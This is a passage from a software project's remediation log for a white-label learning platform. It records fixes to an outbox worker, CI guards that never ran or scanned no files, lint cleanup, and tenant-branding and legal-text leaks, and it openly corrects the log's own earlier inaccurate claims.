Redis outage the limiter degrades to per-process counters and logs (rate-limited to one line per 30s)
rather than failing requests — a throttle is a mitigation, and losing it must not take the platform
down, but it must not silently vanish either.

**2.7 — SMTP, deliberately not a vendor SDK.** Resend, SES, SendGrid, Postmark and Mailgun all
expose SMTP, so this avoids lock-in and avoids making a provider decision on the business's behalf.
The `EmailProvider` seam is unchanged, so an HTTP adapter can be added later without touching
callers. `getEmailProvider` throws when `APP_ENV` is production/staging and the mode is not `smtp`.

**2.8 — the worker surfaced two defects that only appear when the code actually runs.**

The first: **`pollOutboxEventsForProcessing` had no completion filter of any kind.** It selected the
oldest `limit` rows with `available_at <= now()` and nothing else. Since nothing marks an event
done, every poll returned the same rows forever — already-delivered events were re-skipped each
pass, events with no handler in the group left no trace at all, and **anything past the first
`limit` rows was never reached**. The outbox head-of-line blocked permanently. Observed live as a
hot loop reporting `processed: 260, delivered: 0` on every sweep. The poll now takes the group's
`(event_type, destination_key)` subscriptions and excludes events already delivered to all of them,
using the existing unique index on `event_deliveries`. After the fix the same database drained in
two sweeps (39 then 5 delivered) and went idle.

The second: several `@atlas/*` subpath imports were **absent from their package `exports` maps**.
The Next.js bundler resolves those through tsconfig `paths` and never complains, so they were
invisible until code ran under plain Node — which the worker does. Ten specifiers across five
packages were affected, plus six packages whose `"./*"` wildcard mapped to `./src/*` with no
extension. `scripts/guards/check-package-exports.mjs` now fails the build on any such import.

Two new guards were added: `check:outbox-worker` (an exported `process*OutboxBatch` missing from the
worker registry is dead code — the eleventh consumer group would silently repeat C6) and
`check:package-exports`. Both were verified to fail on a deliberately broken input, not just to pass.

> **Correction (2026-08-19): neither of them actually ran in CI.** This paragraph said "run in CI".
> They did not. `.github/workflows/ci.yml` invoked twelve guards and neither of these was among
> them, and `check:package-exports` had **no `package.json` script at all** — it could only be run
> by invoking the `.mjs` file by path. So both were verified once, by hand, and then never executed
> again by anything.
>
> This is the Phase 0 failure mode repeating one level up: Phase 0 was about gates that ran but
> lied, and these were gates that were written, proven, and then left unwired. Writing a guard is
> not the same as running it, and the record claiming otherwise is how it stayed invisible.
>
> Now fixed: `check:package-exports` has a script, and both have `package-exports-check` and
> `outbox-worker-check` jobs in `ci.yml` (32 jobs parse). The positive control was re-run rather
> than trusted — an undeclared `@atlas/core` subpath makes the exports guard exit 1, and removing it
> returns it to OK. Note that a package whose exports map has a `./*` wildcard (most of them)
> matches any subpath by design; the guard bites on packages with explicit maps, which is where the
> Phase 2.8 defects were.

**Worker operation.** `pnpm worker:outbox`. `/healthz` reports liveness from loop **ticks**, not
work done — an idle worker is healthy, a wedged one is not; `/readyz` flips to 503 the moment
shutdown begins. SIGTERM finishes the in-flight tenant/processor unit, stops starting new ones, and
exits 0; a hard deadline guarantees exit even if a database call hangs. A second signal exits
immediately.

**Not verifiable on this machine:** Windows terminates processes without delivering SIGTERM, so
OS-level signal delivery was exercised by emitting the signal in-process. The handler, drain path
and exit code are the same on Linux; only the kernel delivery step is untested here.

**Verification.** typecheck clean. All 12 guards plus the 2 new ones pass. `tests/unit` **1351**
pass (220 files), `tests/db` 16, `tests/events` 16. New tests: rate limit 23, worker 13, email 10,
outbox subscriptions 1. The worker was run end to end against a live database.

### Two gate failures that are NOT Phase 2 regressions — correcting the Phase 0 record

Both were checked against `HEAD` and against a build with the Phase 2 changes stashed, and are
unchanged by this phase. The earlier Phase 0/2 records understated them, so they are corrected here.

**`pnpm lint` completes but reports 1813 errors across 501 files.** Phase 0's goal was that lint
_runs_ (it used to abort with SIGABRT), and that is met. But the backlog it exposed is far larger
than the "5 pre-existing errors" the Phase 2 record claimed — that figure covered only
`backend/packages`. The bulk is `frontend/apps` (1192). Dominant rules: `no-confusing-void-expression`
(657), `require-await` on resource loaders (144), `z.uuid()` deprecations (104),
`no-unnecessary-condition` (79), hardcoded `FundedBeyond` strings (57). Every new file added in
Phase 2 lints clean; the only remaining errors in touched packages are the five `ZodTypeAny`
deprecations in `create-platform-route.ts` already recorded.

_Checked, not assumed:_ the exports-map fixes in 2.8 were suspected of un-suppressing type-aware
rules by repairing type resolution. An A/B run on the same file with and without those changes gave
an identical count, so that is not the cause.

**`pnpm format:check` fails on 1151 files.** Not line endings, as first assumed — genuine
`printWidth: 100` violations. The repo had never been formatted with its own Prettier config.
Confirmed pre-existing: the committed `HEAD` version of `vitest.config.ts` — untouched by any phase
— fails the same check.

---

### Gate remediation (2026-08-17)

**`format:check` — GREEN.** Ran `pnpm format` (1151 files) and added `.gitattributes` pinning
`* text=auto eol=lf`, so a Windows checkout can no longer diverge. Typecheck and the full unit suite
pass unchanged afterwards.

**`tests/authorization` — GREEN, and the 9 failures were real defects, not stale tests.**

Seven admin screens flattened every API failure — including 401/403 — into an inline error banner
beneath a page still claiming `state="ready"`, while the other 219 screens render the denied gate.
Fixed centrally with `isAuthorizationDenied` in `admin-domain-shared.tsx`, plus the messenger and
notifications panels which own their shells.

The assertion itself was the more interesting problem. It read only `page.tsx`, so logic one hop away
was invisible; `"denied"` appears in `AdminPageGate`'s own state union, so **every** screen satisfied
it regardless of behaviour; and comments counted as evidence — `app/admin/notifications/page.tsx`
carried a comment claiming denial was "handled client-side via ClientApiError", which was false, and
that comment was the only reason the screen passed. The check now strips comments, follows imports
two levels, and requires a call rather than a declaration. Verified by deleting the denial branch and
confirming exactly the five dependent screens fail. Two other assertions (`"Decision history"`,
`"AnalyticsDashboard"`) were pinned to strings `git log -S` shows were never in those files, so they
could only ever fail; both were rewritten against the locked spec's actual requirement.

**`pnpm lint` — 1813 → 556, in progress.** Cleared: `eslint --fix` sharded (752); a scoped
`require-await` override for `*.route-metadata.ts` (144 — `ResourceLoaderFn` is typed
`=> Promise<ResourceRef>`, so `async` without `await` is interface conformance, and rewriting each to
`Promise.resolve(...)` would satisfy the linter by making the code worse); a deprecation codemod
(~140) after which the five deprecated push-wizard aliases were **deleted** rather than renamed
around; redundant type conversions (60); and `no-unused-vars` configured to honour the `_` prefix the
codebase already uses (27 — `strictTypeChecked` enables it with defaults, so the convention read as a
mistake in every file using it).

Two of those cleared real defects rather than noise:

- **`no-base-to-string` (70)** flagged `String(row["x"])` over
  `$queryRaw<Record<string, unknown>>`. A `jsonb` column or array stringifies to the literal text
  `[object Object]`, which lands in a CSV export handed to an academy admin. `textColumn` in
  `reports/raw-column.ts` preserves behaviour for every primitive and `Date` and only changes the
  path that was already producing garbage. 192 call sites, 10 repositories.
- **The `params` cluster (~96).** `createTenantRoute<A, B>` supplies two of three generics, so
  TypeScript falls back to the default for the third and handlers saw `Record<string, never>` —
  `params["id"]` was `undefined` at the type level, hence `?? ""` everywhere. No runtime impact, but
  **four routes had no `params` schema at all**, leaving their path params unvalidated while every
  sibling validated with `z.uuid()`. Those now validate. A first blanket codemod over all 77 sites
  was wrong: in resource loaders `params` really is `Record<string, string>` under
  `noUncheckedIndexedAccess`, so the `?? ""` is load-bearing there. Typecheck isolated exactly those
  14 files and they were reverted.

**Third pass (2026-08-18): 386 → 170.** Six of nine shards are clean; `backend/apps` 3,
`backend/packages` 4, `frontend/apps` 206. Cleared: dead `??` operands and optional chains, 46
unused imports/vars, 41 template interpolations, 42 index assertions, the `FormEvent` deprecations,
and `frontend/apps/web/tests/**` which was reported as **parsing errors** rather than linted at all
(a second test tree outside the root `tests/` glob and outside any tsconfig).

Three of those were real bugs, not noise:

- **`no-floating-promises` caught a rate limiter I had broken.** Making `enforcePublicRateLimit`
  async in 2.6 required awaiting it; the backend `diagnostic/merge` route was updated and its
  **frontend twin was not**. The un-awaited call resolved after the handler had already continued,
  so that route was unthrottled from 2.6 until now. Nothing but this rule would have caught it.
- **A `dangerouslySetInnerHTML` missed in 2.3**, found by the ESLint ban 2.3 itself added.
  `NotificationTemplateManager` escapes `&<>` by hand so it is not exploitable, but it bypassed the
  single sanctioned render path — which is how the next unescaped helper would slip in. Now
  `SafeHtml`.
- **Dead-letter replay never confirmed anything.** `DeadLetterEventTable` renders a `role="status"`
  banner from `message`, but `setMessage` was never called, so a successful replay looked identical
  to nothing happening. The F7 test asserted only that the identifier `setMessage` appeared in the
  file. Found because the unused-vars pass removed the setter; fixed by wiring the feedback up.

One self-inflicted error: the optional-chain codemod rewrote `?.()` as `.()` in six files. Typecheck
caught it immediately and all six were repaired.

**Second pass (2026-08-17): 556 → 386.** Five of the nine lint shards are now
completely clean — `tests`, `frontend/packages`, `scripts`, `configs`, `backend/prisma` and the
root file set. `backend/apps` is down to 3 and `backend/packages` to 4. The residue is almost
entirely `frontend/apps` (379), which this pass did not reach.

Notable fixes in that pass, beyond the mechanical ones:

- **`playwright.config.ts` was never linted at all** — it belongs to no tsconfig project, so
  `projectService` reported a parsing error instead of results. Added to the non-type-checked block.
- **Referral and affiliate code generators moved off `Math.random()`** to `crypto.randomInt`. This
  was reached via a `no-non-null-assertion` on the alphabet index, but it closes **audit finding
  H15** (non-CSPRNG on money paths, previously scheduled for Phase 3.5) at the same time.
- **A dead `if / else-if / else` chain in `sales-referrals.service.ts`** whose three branches all
  made the identical call, and whose `else if` was unreachable. Collapsed, with the deliberate
  behaviour (a referral still counts when the wallet soft-fails, so `max_referrals` cannot be
  farmed) written down rather than left implicit.
- **Five dead initialisers** overwritten on every path, and **`no-unused-vars` honouring the `_`
  prefix** the codebase already used.
- **`tmp-*` scratch files** at the repo root broke `pnpm lint` locally while being invisible to CI.
  Added to both `.gitignore` and the ESLint ignores.

Two mistakes in that pass, both caught by typecheck before they landed anywhere: de-asyncing five
synchronous services pushed `require-await` up to their route handlers and turned six `await`s into
no-ops (fixed at both ends), and unwrapping "exhaustive final arm" conditionals hit one chain where
the flagged arm was **not** last, breaking the branch after it (reverted).

**Fourth batch (2026-08-18): 192 -> 170.** Cleared `switch-exhaustiveness-check`, the
branding-title test fixtures, and `AuthShell`.

The switch rule was **misconfigured, not the code**: all ten switches already had a `default:`
clause, and `considerDefaultExhaustiveForUnions` defaults to false, so the rule demanded every union
member be listed anyway — which would have produced dead `case` arms whose bodies duplicate the
default.

**`AuthShell` was a real white-label leak on the most-seen screens in the product.** It fell back to
"FundedBeyond Academy" whenever a tenant had not set a `publicName`, so those academies saw tenant #1
on their own login, signup and password-reset pages — plus a footer disclaimer naming FundedBeyond as
an educational platform. Both now use the tenant name with a neutral fallback.

`frontend/apps/web/tests` is a clean tree now; it had never been linted at all, being reported as
parse errors (a second test tree outside the root glob and outside any tsconfig).

**Still blocked on a product decision:** `VerifyEmailScreen` (hardcoded brand plus the real
support@fundedbeyond.com address), `LoginForm`, `BrandLoadingScreen`, and the `FundedBeyondLanding` /
`FbaLegalDocument` / `terms-content` / `privacy-content` family.

### New finding (2026-08-18): every tenant renders FundedBeyond's logo mark

`lib/brand.ts` exports `FUNDED_BEYOND_LOGO_URL = "/brand/avatar-gradient.svg"`, documented as
"gradient disc + white FB mark" with the note that "the LMS uses a single logo everywhere". It is
imported and rendered by **six shells**: `AdminShell`, `StudioShell`, `AuthShell` (twice),
`BrandLoadingScreen`, `VerifyEmailScreen` and `CertificateBuilderSplash`.

So every academy's admin console, studio, login, signup, password-reset, loading and
certificate-builder screens display tenant #1's monogram. `AuthShell` reads `branding.publicName`
but never `branding.logoLight` / `logoDark`, which the branding record already provides.

**No lint rule can catch this.** `atlas/no-hardcoded-tenant-strings` inspects string literals; this
is a constant identifier, so the guard is silent. It was found by reading the import, not by a gate.

Fixing it means wiring tenant branding through those six shells and deciding what a tenant sees
before uploading a logo (neutral mark, initials, or name-only). That is a product decision, so it is
recorded here rather than guessed at. It is arguably higher-impact than the legal-content item,
since it is on every screen of the product rather than two pages.

**Remaining (170), by disposition:**

| Kind                           | Count | Notes                                                                                             |
| ------------------------------ | ----- | ------------------------------------------------------------------------------------------------- |
| Needs a product/legal decision | 24    | See below — tenant-specific legal content                                                         |
| Needs per-site judgement       | ~250  | `no-non-null-assertion` (112), most `no-unnecessary-condition`                                    |
| Mechanical                     | ~215  | `no-unused-vars` tail, `restrict-template-expressions`, `no-img-element` (21, needs `next/image`) |

**Blocked on a decision — FundedBeyond legal text is hardcoded into shared components.** 24 of the 65
`atlas/no-hardcoded-tenant-strings` violations are tenant #1's Terms and Privacy Policy as module
constants in `features/public/components/legal/`, rendered by an `Fba*` component family
(`FbaLegalDocument`, `FbaDarkModeButton`, `fba-theme.css`) that defaults
`publicName = "FundedBeyond Academy"`. On a white-label platform this means **every tenant serves
FundedBeyond's legal documents**. The lint rule was correct and has been red long enough that nobody
saw it. Moving legal text into tenant config — and deciding what a tenant sees before supplying their
own — is a product and legal call, not a lint fix.

### Fifth pass (2026-08-18): 166 -> 100, and the white-label leak had a deeper cause

Measured, not estimated: `node scripts/ci/run-lint.mjs` reports **100 errors in one shard**
(`frontend/apps`). The other **eight shards are clean**, including `backend/apps` and
`backend/packages`, which were 3 and 4. Typecheck, `format:check`, `db:rls:check` (219 tables) and
**1362 unit tests** pass; all guards pass except the documented `branding/assets/upload`
audit-metadata exception, which is unchanged from Phase 0.

**`no-unnecessary-condition` 46 -> 2.** Almost none of it was dead code:

- **22 sites were a TypeScript limitation, not a defect.** `let cancelled = false` mutated from a
  `useEffect` cleanup closure is correct, but TypeScript does not invalidate narrowing on
  assignments made inside a closure (microsoft/TypeScript#9998), so it narrows the flag to `false`
  for the whole effect body and every guard reads as dead. Deleting them would have reintroduced
  the update-after-unmount race they exist to prevent. An explicit `: boolean` annotation does not
  help — verified against the real config. `lib/effect-cancellation.ts` holds the flag on an object,
  which keeps it honest to both compiler and reader; nine files converted.
- **Four sites were an unchecked `JSON.parse(raw) as T`.** The assertion lied about localStorage
  data, so the compiler believed it and reported the correct validation below as dead. Now parsed as
  `unknown` and narrowed. This also removed a latent bug in `loadTemplateUsage`: a corrupt non-number
  value flowed into `bumpTemplateUsage`'s arithmetic and produced `NaN`.
- **Three exhaustive if-chains became `Record` lookups** rather than being unwrapped. Unwrapping is
  the manoeuvre that broke a chain in the third pass; a `Record` keyed on the union cannot have a
  dead fallback and turns a new union member into a compile error. `AdminSalesMarketingRosterPage`
  had re-derived all seven tab hrefs in a nested ternary that already duplicated `TABS`, so that
  became one exported map.
- **`crypto.subtle` needed the opposite treatment.** The DOM lib types it as always present, but
  browsers leave it undefined on insecure origins — exactly when the non-crypto fallback beneath it
  is needed. The check was widened through a typed local rather than deleted.

**Two dead `mock_test` branches in `progress-score-learner-detail.repository.ts`.** The flagged arm
was `subscription`, which looked like the danger case. It was not: `mock_test` belongs to
`ScoreProductType`, while both functions and every caller use `ProgressProductType`
(`course | test_series | bundle | subscription`). So ~50 lines of unreachable SQL followed the real
final arm, and removing it made `subscription` genuinely last. Verified with `tsc` before and after.

**A type that lied, in `messenger-hub.repository.ts`.** `ActivityRow.kind` was declared
`"sent" | "scheduled" | "draft"`, but the query selects `lower(status)::text` — any status string.
The service's runtime narrowing was load-bearing and the annotation was the wrong part; `kind` is
now `string`. Similarly, a bare `new Map()` fallback in `analytics.service.ts` inferred
`Map<any, any>` and was the actual source of two `no-unsafe-assignment` reports two lines away.

**`login/route.ts` carried a comment that was wrong.** It claimed the `result.status === "signed_in"`
check was "the last arm of an exhaustive chain". `loginWithPassword` returns
`status: "signed_in" as const` unconditionally and throws otherwise, so the check was never a chain
arm at all — a stale note from the third pass, now corrected rather than copied forward.

**`createUuid` was duplicated byte-for-byte** in `upload-lesson-asset.ts`. Deduplicated, and the
hex build rewritten to iterate with `Array.from` (which yields `number`, not `number | undefined`)
instead of six indexed `!` assertions. The assertions were asserting a true invariant, but the
`${hex[0] ?? ""}` chain underneath them was not: a short array would have silently produced a
malformed UUID. Slicing a 32-character string cannot.

#### The three blocked items, now decided and largely implemented

**The fallback-logo leak had a root cause no one had found: `lib/server/bootstrap.ts` was
_overwriting_ tenant branding.** `withFundedBeyondBranding` replaced `logoLightUrl`, `logoDarkUrl`
and `faviconUrl` with FundedBeyond's mark on **every** bootstrap response, at the single point where
branding enters the app. That means the per-tenant `resolveTenantLogoUrl` helper added by an earlier
pass could never work — branding always arrived already carrying tenant #1's asset. The override is
deleted, so tenant logos now flow through for the first time.

Per the product decision, the fallback is a **tenant initials mark**, not a neutral asset:
`components/patterns/TenantBrandMark.tsx` renders the tenant's logo when they have one and otherwise
an initials disc derived from their own `publicName`, with a stable per-name hue. `tenantInitials`
skips generic words so "FundedBeyond Academy" reads "FB" rather than "FA". Wired through `AuthShell`
(×2), `AdminShell`, `StudioShell`, `BrandLoadingScreen`, `VerifyEmailScreen`,
`CertificateBuilderSplash`, `studio-home`, `LandingNav`, `FundedBeyondLanding` and
`FbaLegalDocument`. `PLATFORM_FALLBACK_LOGO_URL` and the `FUNDED_BEYOND_LOGO_URL` alias are **gone**
from `lib/brand.ts`, so the monogram can no longer be anyone's default by import.

`TenantBrandMark` renders tenant logos with `unoptimized`. This is deliberate and load-bearing:
tenant logo URLs are absolute and possibly signed, `next.config.ts` declares no
`images.remotePatterns`, and until now no remote logo URL had ever reached `next/image` because the
bootstrap override masked them all. Without `unoptimized` this change would have thrown at runtime
for every tenant with an uploaded logo.

Several brand _names_ leaked alongside the mark and are fixed with neutral fallbacks:
`BrandLoadingScreen` hardcoded the "FundedBeyond Academy" wordmark; `LandingNav` defaulted to
`"FundedBeyond"`; `FundedBeyondLanding`'s footer hardcoded it — and that component is the public
landing for **every** tenant, via `PublicLandingView`, not just tenant #1; `FbaLegalDocument`
defaulted `publicName` to it; and both legal pages passed it explicitly and named it in the
`<meta name="description">` that search engines index against every tenant's own domain.

**Support address (decision: tenant email, platform-env fallback).** A tenant `supportEmail` already
existed in tenant config but only behind an authenticated route, so the public verify-email screen
could not reach it. It is now published on `/api/v1/public/bootstrap`, and the page prefers it,
falls back to `PLATFORM_SUPPORT_EMAIL` (documented in `.env.example`), and **hides the contact line
entirely** when neither is set rather than pointing one academy's learners at another's inbox.

**Legal content (decision: move to tenant config, FundedBeyond seeded as tenant #1) — NOT DONE.**
This is the one approved decision left unimplemented, and it is deliberate: it needs a
`legal` section in `tenant_config.config_json`, a public read route, a seed carrying the current
text as tenant #1's value, a neutral empty state, and an admin surface for tenants to supply their
own. `config_json` is a JSON blob, so **no migration is required** — but half-building it would be
worse than handing it over specified. The 15 + 9 violations in `terms-content.ts` and
`privacy-content.ts` are deliberately left red rather than suppressed, so the gate keeps pointing at
real unfinished work. **Note the gap this leaves: until it ships, every tenant still serves
FundedBeyond's Terms and Privacy Policy.**

**Remaining (100), all in `frontend/apps`:**

| Rule                                | Count | Disposition                                                        |
| ----------------------------------- | ----- | ------------------------------------------------------------------ |
| `atlas/no-hardcoded-tenant-strings` | 26    | 24 are the legal-content move above; 2 are stragglers              |
| `@next/next/no-img-element`         | 21    | Real `next/image` migration; needs width/height per image          |
| `no-non-null-assertion`             | 17    | All `noUncheckedIndexedAccess` first/last-element reads            |
| misc tail                           | 36    | `misused-promises` 5, `no-deprecated` 5, `require-await` 3, others |

The 17 remaining `!` are one shape: `entries[0]!`, `points[points.length - 1]!` and similar, where a
`length` check the compiler cannot connect has already happened. They want a guarded read or a
`requireFirst`-style helper that throws with context, not `?? ""` — each still needs its own look.

### Sixth pass (2026-08-19): 100 -> 0 — `pnpm lint` is green

`node scripts/ci/run-lint.mjs` reports **"Lint passed in all shards"**. Typecheck, `format:check`,
`db:rls:check` (219 tables), `db:seed:check` and **1366 unit tests** (222 files) pass; every guard
passes except the documented `branding/assets/upload` audit-metadata exception, unchanged since
Phase 0. This closes the lint half of Exit gate 0, first opened in the Phase 0 record.

**Three ESLint plugins are not installed, and 24 errors were only ever that.** The 21
`@next/next/no-img-element` errors were **not** a `next/image` migration, as the fifth-pass table
claimed. Every one of them was reported on an `eslint-disable-next-line` comment with the message
_"Definition for rule '@next/next/no-img-element' was not found."_ Neither
`@next/eslint-plugin-next`, `eslint-plugin-react` nor `eslint-plugin-react-hooks` is a dependency
anywhere or registered in `eslint.config.mjs`; the directives are legacy from a removed
`next lint` / `eslint-config-next` setup. The same cause accounted for one
`react/no-array-index-key` and two `react-hooks/exhaustive-deps` errors.

Installing the plugins would have **added** errors rather than removed them, and would have been
wrong here: all 21 `<img>` elements take a tenant- or user-supplied URL (uploaded covers, avatars,
brand-kit logos) or a local blob preview, so the raw element is correct — the optimizer cannot be
pointed at hosts that are not knowable at build time. The dead directives were removed instead.

> **Worth deciding separately:** this repo runs a Next.js app with **no Next or React ESLint rules
> at all**. `react-hooks/rules-of-hooks` and `exhaustive-deps` in particular catch real bugs that
> nothing else here does. Adopting them is a new workstream with its own backlog, not a lint fix,
> so it is recorded rather than smuggled in.

**A flaw in the fifth pass's own cancellation helper.** Holding the flag as a _property_
(`effect.cancelled`) fixed the closure-narrowing false positive but introduced a subtler one:
TypeScript narrows property reads too, so an effect that checks twice — once after the fetch, once
after parsing — had its **second** check reported as dead. `cancellationFlag()` now exposes
`isCancelled()`; a call expression is never narrowed, so every guard stays honest however many times
it appears. 34 reads and 12 cancellations across nine files.

**`no-non-null-assertion` 17 -> 0, with no `?? ""` anywhere.** Each was a length check the compiler
could not connect to an indexed read. Fixes were per-site: `.at(-1)` locals guarded before use;
`RADIUS_PX` iterated by a `const` key tuple (a `Record` over a finite union indexes to `number`);
`HELP_TIPS` retyped as a non-empty tuple `[HelpTipOfWeek, ...HelpTipOfWeek[]]`, which states the
invariant the modulo already relied on; `formatWatchPair`'s arms reordered so the compiler sees the
`planned != null` case directly; and `DEFAULT_ASSESSMENT_TYPE` given a named const instead of
asserting its own literal back out of a `Record<string, …>` — which also stops the default drifting
from the map.

**Three `no-base-to-string` sites were real user-facing defects**, not noise: `String()` on
`unknown` put the literal text `[object Object]` into a reviewer's answer view and into an
**editable** custom-field input, where saving would have written it over the real value. Both now
enumerate the primitives that stringify meaningfully.

**`document.write` replaced with a Blob URL** in the invoice print preview, and `event.returnValue`
dropped in favour of `preventDefault()` alone.

**`FundedBeyondLanding` renamed to `TenantPublicLanding`.** `no-restricted-imports` already banned
`*fundedbeyond*` import paths with the message _"FundedBeyond must be tenant configuration only"_ —
the rule was right, and the name was especially wrong here because `PublicLandingView` renders this
component as the public landing for **every** tenant. A FAQ answer naming FundedBeyond on every
academy's home page went with it.

#### Legal content — now done

Terms and Privacy are **tenant configuration**, per the approved decision, and needed no migration:
`tenantConfigJson` in the tenant manifest is already applied to `tenant_config.config_json` by
`scripts/tenants/apply-adapter.ts`, so no schema or adapter change was required.

| Piece             | Where                                                                        |
| ----------------- | ---------------------------------------------------------------------------- |
| Shape             | `schemas/public-legal.ts`, mirrored backend + contracts per house convention |
| Storage           | `tenant_config.config_json.legal.{terms,privacy}`                            |
| Read              | `tenant-legal.service.ts`, validating before returning                       |
| Public API        | `GET /api/v1/public/legal/[slug]`                                            |
| FundedBeyond text | `configs/tenants/fundedbeyond/manifest.json` (13 + 14 sections, 79 blocks)   |
| Absent state      | `LegalDocumentUnavailable` — says so plainly                                 |

`terms-content.ts` and `privacy-content.ts` are **deleted**. A malformed stored document reads as
unpublished rather than rendering half an agreement, because the service validates operator-supplied
JSON instead of trusting it.

**The manifest validator had to change, and the change is the interesting part.**
`FORBIDDEN_MANIFEST_TERMS` rejected the seeded text on `"trading account"` and `"payment
processing"`. That guard exists to stop a manifest _declaring_ prop-trading capability the LMS does
not have — but a Terms document has to name those things in order to **disclaim** them ("the Academy
does not operate trading accounts"), and a Privacy Policy has to describe payment processing to
disclose its sub-processors. Scanning prose for capability keywords flags exactly the sentences that
make the boundary explicit, so `tenantConfigJson.legal.*` is now exempt from the term list.
**Secret detection still applies there** — that is about leaked credentials, not vocabulary.

Four regression tests pin the properties that made this worth doing: FundedBeyond's documents parse
from their manifest; `second-smoke-academy` has **no** legal section and must keep having none (a
reintroduced default would put every tenant back on another tenant's agreements); malformed input is
rejected; and the two deleted content modules must not come back.

#### Support address, and a fragility introduced then removed

`VerifyEmailScreen` hardcoded `support@fundedbeyond.com`. Per the decision it now prefers the
tenant's own support address, falling back to `PLATFORM_SUPPORT_EMAIL`. The tenant value already
existed in config (`channels.supportEmail.fromEmail`) but only behind an authenticated
tenant-settings route, so it is published on `/api/v1/public/bootstrap` — it is a public contact
address by nature.

**That first cut had a defect, found by re-reading rather than by any gate.** The response schema
types the field `z.email().nullable()`, and the route passed the configured string straight through.
`fromEmail` is operator-supplied, so a single malformed address would fail `bootstrapResponseSchema.parse`
— and **bootstrap backs every page in the app**, so one typo in tenant config would have 500'd the
entire tenant, not just the verify-email screen. The address is now validated at the resolution
site and degrades to `null`. Probed across six inputs: valid passes through, empty/whitespace and
four malformed forms all resolve to `null`, and none throw. Four tests pin it, including a positive
control proving the raw value _would_ have thrown.

This is the same discipline applied to legal documents, and for the same reason: operator-supplied
config must be validated where a failure is recoverable, never at a boundary where it is fatal.

**Still open, deliberately:** no admin UI exists for a tenant to author their own legal documents —
today it is a manifest edit plus `tenant-config:apply`. And `VerifyEmailScreen`'s footer still reads
"Educational trading readiness academy · Not financial advice", which asserts a trading domain for
every tenant. That is a risk disclaimer, so changing or dropping it is a legal call rather than a
lint fix; it was not among the three approved decisions and is recorded here rather than guessed at.
The same sentence pattern is still in `AuthShell`.

**Final gate state:** `pnpm lint` green in all nine shards, typecheck clean, `format:check` clean,
**1370 unit tests** across 223 files, `db:rls:check` 219 tables, `db:seed:check` both manifests OK,
and every guard passing except `ci:audit-metadata`'s documented `branding/assets/upload` exception —
which, note, is itself **not wired into `ci.yml`** either, so that known failure is invisible to CI.
Wiring it is Phase 1's `branding/assets/upload` audit-write item, not a lint fix.

### Seventh pass (2026-08-19): four CI guards were scanning nothing

Auditing which guards actually run — prompted by finding two that were never wired — turned up a
worse problem than wiring. **Four guards had pre-F-1 scan roots**, and because `walkFiles` swallows
the ENOENT and returns `[]`, they reported success while reading zero or almost zero files. Phase 0
§0.5 was supposed to have swept exactly this, and the Phase 0 record specifically claims
`check-forbidden-scope.mjs` "Covers backend/ and frontend/ locations" — true of its path checks,
false of its source scan.

| Guard                     | Was scanning                            | Now                           |
| ------------------------- | --------------------------------------- | ----------------------------- |
| `check:audit-compliance`  | **0 files** (`apps`, `packages`, `src`) | 2356 backend files            |
| `check:outbox-compliance` | **0 files** (same roots)                | 4768 backend + frontend files |
| `check:secrets`           | no application source at all            | backend + frontend included   |
| `check:forbidden-scope`   | source-term half ~0 files; paths worked | 5000+ files                   |

Every one now has a **vacuity floor** that exits 1 below a minimum file count, so the same stale-path
mistake fails loudly instead of passing quietly. Verified by restoring the old roots: the guard now
reports `scanned only 0 files ... scan roots are stale` and exits 1.

**Each was positive-controlled, not just re-run.** A planted `suspendTenant` definition without audit
fails `check:audit-compliance`; a planted `tradingAccount` fails `check:forbidden-scope`; a planted
`AKIA…` key fails `check:secrets`. All three pass again once removed.

**`check:secrets` found nothing in application source** — reassuring, and it is the first time that
has actually been checked. Two patterns were added while there: the repo integrates Stripe and
Razorpay and `tenant-config/validate.ts` already rejects `sk_live_` in manifests, but the repo-wide
scanner had no such pattern, so a live payment key in application source would have passed. It now
catches `sk_live_` / `rk_live_` and `rzp_live_` (both probed).

**`check:audit-compliance` needed real repair, not just new roots.** Turned on as-written it reported
**1344 failures**, because `content.includes("createTenant")` matches `createTenantRoute` — which
every route file imports. Three unsound behaviours were fixed:

- **substring → word boundary** (1344 → 130);
- **generic English terms removed** — `publish`, `unpublish`, `grade`, `moderate` match permission
  identifiers (`"course.publish"`; `.` is a word boundary), error copy, permission matrices and
  authorization predicates. All 27 files they flagged were prose or permission strings;
- **definition, not call** — `await issueCertificate(...)` in a worker delegates to
  `certificate.service`, which does write audit. Imports and `export … from` re-exports are stripped,
  and `*.repository.ts` is exempt because audit is written by the orchestrating service. This is the
  same one-hop blindness the authorization suite had when it read only `page.tsx`.

It is now green and meaningful. `ci:audit-metadata` remains the precise, permission-driven version of
this rule; this heuristic exists to catch mutation helpers that never reach a route.

> **`check:outbox-compliance` is red, and deliberately left red: 26 findings.**
> Correcting its roots turned a guard that read nothing into one reporting a genuine backlog —
> report delivery, payment adapters, marketing-integration dispatch and Zoom services that look like
> side effects without an approved outbox path. Clearly-wrong matches were removed (generated Prisma
> models, DTO/schema declaration modules, `.d.ts`, and `safeOutboundFetch` itself — the sanctioned
> wrapper from 2.4, i.e. the mechanism rather than an un-outboxed caller), and `webhook` was made
> word-boundary so `webhookUrl` config fields on export destinations stop matching. That took it from
> 59 to 26.
>
> The residue needs architectural judgement — several are plausibly invoked _from_ an outbox
> processor already, which the guard cannot see. Tuning further to reach green would be manufacturing
> false confidence, which is the failure this programme exists to remove, so it is reported instead.
> This mirrors Phase 0's stance: _"The gates now work; they are red because the codebase is."_

#### The 26 reviewed (2026-08-19): 25 false positives, 1 real defect

Reading every one of the 26 found a single genuine problem. The other 25 were the term appearing as
something other than a call, in five recurring shapes:

| Shape                                                     | Count | Example                                                    |
| --------------------------------------------------------- | ----- | ---------------------------------------------------------- |
| `"webhook"` as an enum / kind value                       | 7     | `d.kind = 'webhook'`, `"email" \| "webhook" \| "storage"`  |
| `"webhook"` as a display label                            | 6     | `webhookLabel: webhookUrl ? "webhook" : null`              |
| `*_WEBHOOK_SECRET` env names for **inbound** verification | 4     | Stripe / Razorpay signature checks                         |
| `sendEmail` as an injected dependency or capability flag  | 3     | `sendEmail: emailProvider.isConfigured()`                  |
| Delegation — an `import` of a service that _does_ enqueue | 5     | `import { issueCertificate } from "./certificate.service"` |

Inbound webhook _verification_ is worth calling out: it is the opposite direction from the outbound
dispatch this rule governs, so those four could never have been violations.

The guard was corrected accordingly — terms now require a **call shape** (`sendEmail(`, not
`sendEmail:`), the bare noun `webhook` was dropped as unusable (it is a domain word in every
export-destination and schedule module), imports and re-exports are stripped, and the import graph is
followed **both ways**: downstream to the service that owns the effect, and upstream to the handler
that invokes it. That last one matters — `reports-delivery.ts` is called only from
